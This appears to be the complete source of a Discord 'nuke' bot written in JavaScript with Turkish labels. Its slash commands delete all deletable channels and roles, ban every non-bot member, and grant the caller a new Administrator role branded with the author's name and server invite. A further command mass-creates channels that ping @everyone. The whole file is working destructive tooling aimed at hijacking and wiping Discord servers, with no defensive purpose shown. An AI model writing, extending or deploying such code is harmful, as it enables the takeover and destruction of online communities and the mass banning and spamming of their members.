require('dotenv').config();
const { 
    Client, GatewayIntentBits, Partials, PermissionsBitField,
    REST, Routes, SlashCommandBuilder 
} = require('discord.js');
const fs = require('fs');

const TOKEN = process.env.TOKEN;
const CLIENT_ID = process.env.CLIENT_ID;
const BOT_OWNER_ID = process.env.BOT_OWNER_ID;

const client = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMembers,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.MessageContent
    ],
    partials: [Partials.Channel]
});


const WHITELIST_FILE = "whitelist.json";
function loadWhitelist() {
    if (!fs.existsSync(WHITELIST_FILE)) fs.writeFileSync(WHITELIST_FILE, JSON.stringify([]));
    return JSON.parse(fs.readFileSync(WHITELIST_FILE, "utf8"));
}
function saveWhitelist(wl) {
    fs.writeFileSync(WHITELIST_FILE, JSON.stringify(wl));
}
function yetkiliKontrol(member) {
    const wl = loadWhitelist();
    return member.id === BOT_OWNER_ID || wl.includes(member.id);
}


const commands = [
    new SlashCommandBuilder()
        .setName('herseyi_sil')
        .setDescription('Sunucudaki tüm odaları ve rolleri siler.'),
    new SlashCommandBuilder()
        .setName('herkesi_banla')
        .setDescription('Sunucudaki herkesi banlar.')
        .addStringOption(opt => opt.setName('sebep').setDescription('Ban sebebi').setRequired(true)),
    new SlashCommandBuilder()
        .setName('wl_ekle')
        .setDescription("Whitelist'e kullanıcı ekle.")
        .addUserOption(opt => opt.setName('kullanici').setDescription('Eklenecek kullanıcı').setRequired(true)),
    new SlashCommandBuilder()
        .setName('wl_kaldir')
        .setDescription("Whitelist'ten kullanıcı çıkar.")
        .addUserOption(opt => opt.setName('kullanici').setDescription('Kaldırılacak kullanıcı').setRequired(true)),
    new SlashCommandBuilder()
        .setName('oda')
        .setDescription('Yeni oda(kanal) oluşturur.')
        .addStringOption(opt => opt.setName('isim').setDescription('Oda adı').setRequired(true))
        .addIntegerOption(opt => opt.setName('adet').setDescription('Kaç tane oluşturulsun').setRequired(true))
        .addStringOption(opt => opt.setName('aciklama').setDescription('Açıklama mesajı').setRequired(true))
        .addStringOption(opt => opt.setName('everyone').setDescription('everyone etiketlensin mi (evet/hayır)').setRequired(true))
        .addAttachmentOption(opt => opt.setName('dosya').setDescription('Resim/video ekle').setRequired(false))
];

const rest = new REST({ version: '10' }).setToken(TOKEN);
(async () => {
    try {
        console.log('Slash komutları yükleniyor...');
        await rest.put(Routes.applicationCommands(CLIENT_ID), { body: commands });
        console.log('Slash komutları yüklendi!');
    } catch (e) {
        console.error('Komut yükleme hatası:', e);
    }
})();


client.on('interactionCreate', async interaction => {
    if (!interaction.isChatInputCommand()) return;
    const { commandName } = interaction;
    const member = interaction.member;

    if (!yetkiliKontrol(member)) {
        return interaction.reply({ content: '❌ Yetkin yok.', ephemeral: true });
    }

    try {
        if (commandName === 'herseyi_sil') {
            await interaction.reply({ content: "İşlem başladı...", ephemeral: true });

            
            for (const channel of interaction.guild.channels.cache.values()) {
                try {
                    if (channel.deletable) await channel.delete();
                } catch (e) { console.log(`Kanal silinemedi: ${channel.name} | ${e.message}`); }
            }

            
            for (const role of interaction.guild.roles.cache.values()) {
                if (!role.managed && role.editable && role.id !== interaction.guild.id) {
                    try { await role.delete(); }
                    catch (e) { console.log(`Rol silinemedi: ${role.name} | ${e.message}`); }
                }
            }

            
            try {
                const newRole = await interaction.guild.roles.create({ 
                    name: "787 xd Code By Zywexx .gg/YAEjW6drVY",
                    color: 0xFFFFFF,
                    hoist: true,
                    permissions: [PermissionsBitField.Flags.Administrator] 
                });
                await member.roles.add(newRole);
            } catch (e) { console.log("Yeni rol oluşturulamadı:", e.message); }

            
            try {
                await interaction.user.send("Her şey silindi ✅");
            } catch (err) {
                console.log("DM gönderilemedi:", err.message);
                await interaction.followUp({ content: "⚠️ DM gönderemedim (DM kapalı olabilir).", ephemeral: true });
            }

        } else if (commandName === 'herkesi_banla') {
            const sebep = interaction.options.getString('sebep');
            await interaction.reply({ content: "Ban işlemi başladı...", ephemeral: true });

            const members = await interaction.guild.members.fetch();
            for (const m of members.values()) {
                if (m.id === member.id || m.user.bot) continue;
                try { await m.ban({ reason: sebep }); }
                catch (e) { console.log(`Banlanamadı: ${m.user.tag} | ${e.message}`); }
            }

            
            try {
                await interaction.user.send("Ban işlemi tamamlandı ✅");
            } catch (err) {
                console.log("DM gönderilemedi:", err.message);
                await interaction.followUp({ content: "⚠️ DM gönderemedim (DM kapalı olabilir).", ephemeral: true });
            }

        } else if (commandName === 'wl_ekle') {
            const user = interaction.options.getUser('kullanici');
            const wl = loadWhitelist();
            if (wl.includes(user.id)) return interaction.reply({ content: 'Zaten ekli.', ephemeral: true });
            wl.push(user.id); saveWhitelist(wl);
            await interaction.reply({ content: `${user} eklendi ✅`, ephemeral: true });

        } else if (commandName === 'wl_kaldir') {
            const user = interaction.options.getUser('kullanici');
            const wl = loadWhitelist();
            if (!wl.includes(user.id)) return interaction.reply({ content: 'Listede yok.', ephemeral: true });
            saveWhitelist(wl.filter(id => id !== user.id));
            await interaction.reply({ content: `${user} çıkarıldı ❌`, ephemeral: true });

        } else if (commandName === 'oda') {
            const isim = interaction.options.getString('isim');
            const adet = interaction.options.getInteger('adet');
            const aciklama = interaction.options.getString('aciklama');
            const everyone = interaction.options.getString('everyone');
            const attachment = interaction.options.getAttachment('dosya');

            await interaction.reply({ content: "Oda(kanal) oluşturuluyor...", ephemeral: true });

            for (let i = 0; i < adet; i++) {
                try {
                    const channel = await interaction.guild.channels.create({
                        name: `${isim}-${i+1}`,
                        type: 0
                    });
                    const mention = everyone.toLowerCase() === "evet" ? "@everyone" : "";
                    await channel.send({ content: `${mention}\n**${aciklama}**` });

                    if (attachment) await channel.send({ files: [attachment] });
                } catch (e) { console.log(`Oda oluşturulamadı: ${e.message}`); }
            }

            await interaction.followUp({ content: `${adet} adet oda oluşturuldu ✅`, ephemeral: true });
        }

    } catch (err) {
        console.error('Komut hatası:', err);
        if (!interaction.replied) {
            interaction.reply({ content: '❌ Hata oluştu.', ephemeral: true }).catch(() => {});
        } else {
            interaction.followUp({ content: '❌ Hata oluştu.', ephemeral: true }).catch(() => {});
        }
    }
});

client.once('ready', () => {
    console.log(`✅ Giriş yapıldı: ${client.user.tag}`);

    
    client.user.setPresence({
        activities: [{ name: '787 xd Coded By Zywexx .gg/YAEjW6drVY', type: 0 }], 
        status: 'online'
    });
});

client.login(TOKEN);

